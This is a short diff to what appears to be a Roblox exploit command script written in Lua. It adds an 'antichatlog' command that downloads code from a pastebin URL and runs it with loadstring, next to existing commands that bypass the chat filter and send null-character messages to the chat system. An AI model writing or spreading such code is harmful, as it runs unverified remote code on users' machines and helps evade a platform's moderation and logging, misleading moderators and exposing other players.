@@ -7906,6 +7906,10 @@ AddCommand("chatbypass", {}, "bypasses chat filter", {}, function(Caller)
 })
 end)
 
+AddCommand("antichatlog", {}, "blocks roblox from logging your chat", {}, function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/c0hxq4j1"))()
+end)
+
 AddCommand("errorchat", {}, "makes the chat error appear", {}, function()
 	for i=1,3 do 
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\0", "All")
